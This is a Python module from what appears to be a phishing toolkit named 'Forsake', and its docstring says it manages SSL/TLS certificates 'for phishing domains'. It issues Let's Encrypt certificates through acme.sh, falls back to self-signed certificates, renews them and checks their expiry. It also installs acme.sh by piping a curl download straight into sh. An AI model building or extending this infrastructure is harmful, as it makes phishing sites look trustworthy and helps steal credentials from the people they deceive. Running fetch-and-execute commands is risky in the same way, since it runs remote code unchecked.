"""
SSL/TLS Certificate Manager — automated Let's Encrypt via acme.sh.
Created by ANONYMOUS-BETA
"""

from pathlib import Path
from typing import Optional

from . import config as cfg
from .utils import ensure_directory, run_command


class CertManager:
    """Manages SSL/TLS certificates for phishing domains."""

    def __init__(self, forsake):
        self.forsake = forsake

    def obtain(self, domain: str, email: str = None) -> bool:
        """
        Obtain a Let's Encrypt certificate using acme.sh.
        Falls back to self-signed if issuance fails.
        """
        if not email:
            email = f"admin@{domain}"

        if not cfg.ACME_BIN.exists():
            self._install_acme_sh(email)

        ensure_directory(cfg.CERTS_DIR)

        print(f"[*] Issuing SSL certificate for {domain}...")

        cmd = [
            str(cfg.ACME_BIN), "--issue",
            "-d", domain, "-d", f"www.{domain}",
            "--standalone", "--keylength", "ec-256", "--force",
            "--cert-home", str(cfg.CERTS_DIR),
            "--log", str(cfg.LOGS_DIR / "acme.log"),
        ]
        rc, out, err = run_command(cmd, timeout=90)

        if rc == 0:
            install_cmd = [
                str(cfg.ACME_BIN), "--install-cert",
                "-d", domain, "--ecc",
                "--fullchain-file", str(cfg.CERTS_DIR / "fullchain.pem"),
                "--key-file", str(cfg.CERTS_DIR / "key.pem"),
                "--reloadcmd", "systemctl reload nginx",
            ]
            run_command(install_cmd)
            print(f"[+] Let's Encrypt certificate obtained for {domain}")
            return True
        else:
            print(f"[-] Certificate issuance failed: {err}")
            print("[*] Falling back to self-signed certificate...")
            return self.generate_self_signed(domain)

    def _install_acme_sh(self, email: str):
        """Install acme.sh via the official installer."""
        print("[*] Installing acme.sh...")
        cmd = f'curl -fsSL https://get.acme.sh | sh -s email={email}'
        rc, out, err = run_command(cmd, timeout=60, shell=True)
        if rc != 0:
            raise RuntimeError(f"acme.sh installation failed: {err}")
        print("[+] acme.sh installed")

    def generate_self_signed(self, domain: str) -> bool:
        """Generate a self-signed certificate as fallback."""
        print(f"[*] Generating self-signed certificate for {domain}...")
        key_path = str(cfg.CERTS_DIR / "key.pem")
        cert_path = str(cfg.CERTS_DIR / "fullchain.pem")
        subj = f"/C=US/ST=State/L=City/O=Forsake/CN={domain}"

        cmd = [
            "openssl", "req", "-x509", "-nodes", "-days", "365",
            "-newkey", "rsa:2048",
            "-keyout", key_path,
            "-out", cert_path,
            "-subj", subj,
        ]
        rc, out, err = run_command(cmd)
        if rc == 0:
            print(f"[+] Self-signed certificate generated for {domain}")
            return True
        raise RuntimeError(f"Self-signed cert generation failed: {err}")

    def renew(self) -> bool:
        """Renew all certificates managed by acme.sh."""
        print("[*] Checking for certificate renewals...")
        rc, out, err = run_command([str(cfg.ACME_BIN), "--renew-all"])
        if rc == 0:
            print("[+] Certificates renewed (if needed)")
            return True
        print(f"[-] Renewal check completed with issues: {err}")
        return False

    def check_expiry(self, domain: str = None) -> Optional[int]:
        """Check days until certificate expiry."""
        cert_path = cfg.CERTS_DIR / "fullchain.pem"
        if not cert_path.exists():
            return None

        cmd = ["openssl", "x509", "-in", str(cert_path), "-noout", "-enddate"]
        rc, out, err = run_command(cmd)
        if rc == 0 and out:
            from datetime import datetime
            # out is like "notAfter=Aug  2 12:00:00 2027 GMT"
            date_str = out.split("=", 1)[1].strip()
            expiry = datetime.strptime(date_str, "%b %d %H:%M:%S %Y %Z")
            delta = expiry - datetime.now()
            return delta.days
        return None

    def get_cert_info(self) -> dict:
        """Get information about the current certificate."""
        cert_path = cfg.CERTS_DIR / "fullchain.pem"
        if not cert_path.exists():
            return {"exists": False}

        info = {"exists": True}

        rc, out, _ = run_command(["openssl", "x509", "-in", str(cert_path), "-noout", "-subject"])
        if rc == 0:
            info["subject"] = out

        rc, out, _ = run_command(["openssl", "x509", "-in", str(cert_path), "-noout", "-issuer"])
        if rc == 0:
            info["issuer"] = out

        info["days_remaining"] = self.check_expiry()
        return info
